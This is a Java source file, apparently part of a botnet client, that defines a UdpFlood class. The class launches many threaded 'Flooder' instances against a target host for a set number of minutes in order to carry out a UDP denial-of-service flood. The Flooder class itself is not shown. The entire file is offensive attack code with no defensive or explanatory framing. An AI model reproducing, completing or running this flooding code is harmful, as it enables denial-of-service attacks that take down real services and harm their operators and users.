package com.example.botclient.udpflood;

import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

public class UdpFlood
{
    private int threads;
    private int attackMinutes;
    private boolean running;
    private String target;
    private ArrayList<Flooder> flooders;

    public UdpFlood(int threads, int attackMinutes, String target) {
        this.threads = threads;
        this.attackMinutes = attackMinutes;
        this.target = target;
    }

    public UdpFlood()
    {
        flooders = new ArrayList<>();
    }

    public boolean isRunning()
    {
        return running;
    }

    public void start()
    {
        flooders = new ArrayList<>();

        System.out.println("Starting up with "+threads+" threads, for "+attackMinutes+" minutes...");
        running = true;
        System.out.println("Starting attack. . .");

        for (int i=0; i<threads; i++)
        {
            try {
                flooders.add(new Flooder(target,attackMinutes));
            }
            catch
            (   UnknownHostException | SocketException ex) {
                System.out.println(ex);
                Logger.getLogger(UdpFlood.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        for (Flooder flooder : flooders)
        {
            flooder.start();
        }
        System.out.println("Attack started!");
    }

    public void stop()
    {
        System.out.println("Udp Flood attack stopped.");

        for (Flooder flooder : flooders)
        {
            flooder.stop();
        }

        running = false;
    }
}
